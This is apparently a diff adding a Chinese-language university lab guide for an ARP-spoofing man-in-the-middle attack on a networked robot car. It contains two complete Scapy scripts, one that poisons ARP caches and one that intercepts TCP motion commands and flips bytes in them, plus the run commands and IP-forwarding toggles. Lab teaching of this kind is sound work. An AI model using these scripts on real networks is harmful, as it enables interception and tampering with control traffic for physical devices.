@@ -1,0 +1,97 @@
+1.控制机按照实验二步骤连接小车，并能够键盘控制移动
+2.攻击机在虚拟机上新建文件夹，编写两个python文件用于arp攻击
+（可直接使用提供的中间人攻击代码，但是需要根据你的实际情况在相应地方修改实际地址）
+arp欺骗脚本arp-cheat.py：
+#!/usr/bin/python
+from scapy.all import *
+from time import *
+
+IP_A    = "此处填写控制机的ip"
+
+IP_B    = "此处填写小车ip"
+
+MAC_M     = "此处填写攻击机真机mac地址"
+
+print("SENDING SPOOFED ARP REQUEST......")
+
+ether = Ether()
+ether.dst = "ff:ff:ff:ff:ff:ff"
+ether.src = "02:42:c0:a8:3c:03"
+
+arp = ARP()
+arp.psrc  = IP_B
+arp.hwsrc = MAC_M
+arp.pdst  = IP_A
+arp.op = 1
+frame1 = ether/arp
+arp2 = ARP()
+arp2.psrc = IP_A
+arp2.hwsrc = MAC_M
+arp2.pdst = IP_B
+arp2.op = 1
+frame2 = ether/arp2
+while 1:
+  sendp(frame1)
+  sendp(frame2)
+  sleep(5)
+数据篡改脚本datacheat.py：
+from scapy.all import *
+import numpy as np
+IP_A='192.168.1.117' #"此处填写控制机ip"
+IP_B='192.168.1.118'
+MAC_A='' #'此处填写控制机真机mac地址'
+MAC_B='' #'此处填写小车mac地址'
+MAC_M=''#'此处填写攻击机真机mac地址'
+linearX, linearY, linearZ, argularX, argularY, argularZ=0.01,0.0,0.0,0.0,0.0,0.1
+test=b'\x30\x00\x00\x00'+struct.pack('dddddd',linearX,linearY,linearZ,argularX,argularY,argularZ)
+def spoof_pkt(pkt):
+  try:
+    if(pkt.src==MAC_M):
+      return
+    if(pkt[IP].src==IP_A and pkt[IP].dst==IP_B):
+      pkt.src=MAC_M
+      pkt.dst=MAC_B
+      Bytes = pkt[TCP].load
+      if(Bytes[0:4]==b'\x30\x00\x00\x00'):
+        #pkt.show()
+        print("[prev]: ",pkt[TCP].load)
+        i=len(Bytes)
+        temp=bytearray(Bytes)
+        total = len(temp)
+        base = 0
+        while base + 51 <= total:
+            temp[base+11]=(int(Bytes[11])^(8*16))
+            temp[base+51]=(int(Bytes[51])^(8*16))
+            base+=52
+        Bytes=bytes(temp)
+        pkt[TCP].load= Bytes
+        print("[new]: ",pkt[TCP].load)
+        #pkt.show()
+    elif(pkt[IP].src==IP_B and pkt[IP].dst==IP_A):
+      pkt.src=MAC_M
+      pkt.dst=MAC_A
+    del(pkt.chksum)
+    del(pkt[TCP].chksum)
+    #pkt.show()
+    sendp(pkt)
+  except Exception as e:
+    print("[-] Error = "+str(e))
+    if(pkt.type!=2054 and str(e)!="load"):
+      pass #pkt.show()
+    try:
+      sendp(pkt)
+    except Exception as e2:
+      pass
+
+f= "host "+IP_A+" and host "+IP_B+" and tcp"
+pkt = sniff(filter=f,iface='eth0', prn=spoof_pkt)
+3.在攻击机上运行arp欺骗脚本，同时开启ip转发
+sudo python3 arp-cheat.py
+sudo -i
+echo 1 > /proc/sys/net/ipv4/ip_forward 								#开启IP转发
+#小车可以移动
+echo 0 > /proc/sys/net/ipv4/ip_forward
+#小车无法移动
+4.控制机关闭ip转发，攻击机端运行数据篡改脚本
+sudo python3 datacheat.py
+#此时控制小车发现可以移动，因为数据篡改脚本提供了ip转发服务，同时输入的指令会反作用在小车上（迫于网络原因可能并不好，小车能动就行）
